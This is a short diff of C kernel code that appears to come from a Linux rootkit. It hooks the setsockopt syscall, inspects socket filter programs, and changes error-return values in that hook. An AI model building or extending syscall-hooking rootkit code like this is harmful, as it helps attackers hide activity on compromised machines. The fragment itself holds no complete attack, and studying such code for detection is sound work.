@@ -161,20 +161,19 @@ static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
     struct sock_fprog user_fprog;
 
     int err = orig_setsockopt(regs);
-    if (err) {
+    if (err)
         return err;
-    }
 
     file = fget(fd);
     if (file == NULL) {
         ROOTI_DEBUG("fget() failed");
-        return fd;   
+        return 0;   
     }
     sock = sock_from_file(file);
     fput(file);
     if (sock == NULL) {
         ROOTI_DEBUG("sock_from_file() failed");
-        return fd;
+        return 0;
     }
 
     switch (optname) {
